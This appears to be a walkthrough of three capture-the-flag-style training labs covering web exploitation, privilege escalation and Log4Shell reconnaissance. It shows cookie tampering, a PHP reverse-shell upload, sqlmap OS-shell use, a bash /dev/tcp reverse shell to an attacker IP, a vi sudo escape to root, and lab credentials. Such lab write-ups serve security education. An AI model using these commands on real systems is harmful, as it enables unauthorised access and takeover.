![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/59839b59-15ea-429e-94e8-63090e1b6e7a)

This what we will do today :)
1. With what kind of tool can intercept web traffic? 
This will be just: proxy

2. What is the path to the directory on the webserver that returns a login page? 
For this kind of enumeration i recomend to use: feroxbuster, but in this lab this doesn't work. I turn on the BurpSuite and also proxy, refresh the page and traffic some packiet, there was /cdn-cgi i insert this in ffuf and i got the /cdn-cgi/login, this is answer for the question.

3. What can be modified in Firefox to get access to the upload page? 
This will be a: cookie 

4. What is the access ID of the admin user? 
Here we need to find the IDOR, i log in as a guest, and there we can see on the navbar, account i go there and in the URL you can see something intresting http://10.129.213.188/cdn-cgi/login/admin.php?content=accounts&id=2 i tryed change this from 2 to 1 and i got the Cookie-user: 34322

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/c8690ed3-953e-4c4b-b63c-8cbb4ba4b17c)

5. On uploading a file, what directory does that file appear in on the server? 
Again i used ffuf to do some recon, to find the directory, after few secend i did it, here's the results:
This will be /uploads

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/06067e2c-e923-4675-9630-ee955d15f16c)

6. What is the file that contains the password that is shared with the robert user? 
We need to step back little bit, the target is upload the reverse-shell, first what i did is turn on the burp and intercept the traffic. Then change the in Cookie=user: 2233 role=guest to, Cookie=user: 34322 role=admin, you will get access as a admin, then cp on your computer the reverse-shell ~by this command: cp /usr/share/webshells/php/php-reverse-shell.php ~

You need to open with nano or vim, and change this paramiter: $ip, on your own ip.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/0e210008-ffd0-4c87-8d24-74181ad3cdb6)

If u change, let's go upload this RCE :P, but rember to change the Cookie=user:, role= without this u can't upload file on the server. If u did this, you can see the announcement  The file php-reverse-shell.php has been uploaded. 
No go to the /uploads, before that rember to turn on the netcat -lvnp 1234 to get a RCE. Something was wrong, i tryed to go /uploads be only what i can see is Forbidden, then /uploads/php-reverse-shell.php but still nothing, i tryed again upload this RCE and i got this :P
Rember to google better shell python and insert in your shell: python3 -c 'import pty; pty.spawn("/bin/bash")'

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/1b600a43-7e46-43fc-acd8-94412accdd5b)

7. What is the file that contains the password that is shared with the robert user? 
I don't did any recon, i got the RCE and there i foud this, the file that contains the password is db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

8. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 
The answer is: find

9. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? 
The answer is: root, you can check this by command ls -la

10. What SUID stands for? 
This we need to google, because i have no idea what can mean this acronym:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/ec4ca946-f826-44c3-a21f-2a687ab2dac1)

11. What is the name of the executable being called in an insecure manner? 
I analyz the Provide Bug ID: and there only 3, but when i insert 4, i can see this: cat: /root/reports/4: No such file or directory, now we know script read the file only, now we need to figure out how we can use this to get access by root.

12. Submit user flag 
By before this, here's the user.txt ![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/ddf8e1d3-2577-40c8-9fa1-bfc4acd060a4)

13. Submit root flag
Here's the way how you can exploit it.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/20ee9bff-d43a-42bb-92cf-e823d0eb0b7a)

And now u have a access as root.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/20cf4eda-d02b-4088-a4a5-dc36f5848f65)
![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/9b0e178d-9c91-4994-a0c0-7a5bd8620dd6)


The next lab:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/0cce350a-6377-44b4-9827-26b64dfa8fad)

1. Besides SSH and HTTP, what other service is hosted on this box?
I did a scan
There no many port's only 3, SSH, HTTP, FTP. But you can see, we can log in as Anonymous to FTP.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/c115a783-7036-4319-b81f-49c523403107)

2. This service can be configured to allow login with any password for specific username. What is that username? 
We can see on the scan, the answer is Anonymous

3. What is the name of the file downloaded over this service?
After when we log in,in to FTP we can see there: backup.zip

4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? 
First we need to use zip2john tool: zip2john backup.zip > hash.txt, then u need to use john to crack the hash by command, john -w=/usr/share/wordlist/rockyou.txt hash.txt and u will get the password: 741852963, then you need to unzip backup.zip and insert the password you will get 2 files. index.php, style.css 

5. What is the password for the admin user on the website? 
We need to read the code in file index.php, there we can see the password for admin.
But how can see in this code md5($_POST['password']), this is encode in MD5, we need to decode this pasword, i used crackstation and i got the passowrd:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/fa51c08a-9772-42cf-9d8b-1899faca10be)
![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/bb7f8ea2-ef54-4ef6-8834-ba29852738fc)

6.What option can be passed to sqlmap to try to get command execution via the sql injection? 
We need to check the sqlmap -h, there i found the switch to get command execution
```
Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
```

7. What program can the postgres user run as root using sudo? 
First we need to do RCE, insert in your terminal: 
```
sqlmap -u "http://10.129.228.13/dashboard.php?search=any+query" --cookie="PHPSESSID=2feacs4fsqv5ag51igr7nvf7q6" --os-shell
```
This will help us to get a RCE, then turn on the netcat: nc -lvnp 4444
And your sqlmap will a message will appear
Like this:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/a08961fb-c0c8-4e6f-9c81-aebbb08b41b9)

You need to insert there: bash -c "bash -i >& /dev/tcp/10.10.16.21/4444 0>&1"
But rember change the ip, also in this reverse-shell like in command sqlmap, if you don't change the ip and --cookie u don't get access, you can find your cookie by press right click on your mouse inspect, then go to network there it is.
But when you change everything you can see this:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/157f16da-4ae7-4301-961c-5fb95cab94e4)

Rember to insert this: python3 -c 'import pty; pty.spawn("/bin/bash")'
Here's answer to 8 question, here's user.txt flag.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/0aef785a-6c91-4217-8b71-2b5808db6ed1)

If we want use command sudo -l we need to find password.
I go to var/www/html and isert command grep -iR password and now i know the passowrd is in index.php

```
grep -iR password
dashboard.php:    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
index.php:  if(isset($_POST['username']) && isset($_POST['password'])) {
index.php:    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
index.php:        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
index.php:        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
```
Now we need to use this password.
Now we know what program can the postgres user run as root using sudo
```
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

9. Submit root flag 
Beacause this shell was not stable i change to SSH and that was perfect idea, know when we know what program can the posgres user run as root using sudo, search something about it on gtfobins i try 2 example to get a root but this don't wanna work. But then i try this i got the root
```
vi
:set shell=/bin/sh
:shell
```
open udo /bin/vi /etc/postgresql/11/main/pg_hba.conf
Then insert this above command and you will get a root :P

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/b7c127b8-fc1f-4467-98a5-df51510cffba)

The next lab is:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/11d9fe1d-2a20-40fe-bbb8-e1449cfc4ede)

1. Which are the first four open ports? 
We need to turn on the nmap, and check what's running on the server.
Holy shit i run the scan, and i got the many information.
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 07:32 EDT
Nmap scan report for 10.129.225.29
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
|_http-title: Did not follow redirect to https://10.129.225.29:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Sat, 30 Sep 2023 11:32:35 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Sat, 30 Sep 2023 11:32:33 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Sat, 30 Sep 2023 11:32:35 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 30 Sep 2023 11:32:35 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|     Request</h1></body></html>
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 30 Sep 2023 11:32:37 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=9/30%Time=65180752%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Sat,\x2030\x20Sep\x202023\x
SF:2011:32:33\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84,"H
SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
SF:tent-Length:\x200\r\nDate:\x20Sat,\x2030\x20Sep\x202023\x2011:32:35\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x204
SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Sat,\x2030\x20Sep\x202023\
SF:x2011:32:35\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><ht
SF:ml\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
SF:0Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family
SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
SF:one;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
SF:Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1\.1\
SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Sat,\x2030\x20Sep\x202
SF:023\x2011:32:35\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80\x9
SF:3\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
SF::none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x93\x
SF:20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x20435\r\nDate:\x20Sat,\x2030\x20Sep\x202023\x2011:3
SF:2:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.15 seconds
```
Now we need what kind of port are running on the server.
22,6789,8080,8443
2. What is the title of the software that is running running on port 8443? 
We can the this info from previouse scan:
```
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
```
3. What is the version of the software that is running? 
I go the website on port 8080, and there we can see the log in panel, also there is the version

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/cd022876-1641-4824-89c4-55e7db44246c)

4. What is the CVE for the identified vulnerability? 
I wrote in google the version of the aplication and i found the CVE on the officla UniFi website, this is a:  CVE-2021-44228 

5. What protocol does JNDI leverage in the injection? 
I found more information about this CVE on the this website below, the protocol is LDAP, if you want i recomend to read more about this.
https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

6.What tool do we use to intercept the traffic, indicating the attack was successful? 
This will be a tcpdump

7. What port do we need to inspect intercepted traffic for? 
We need google it, because i have no idea on what port working LDAP

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/d2e97617-c27c-4ca7-a112-97ed37508791)

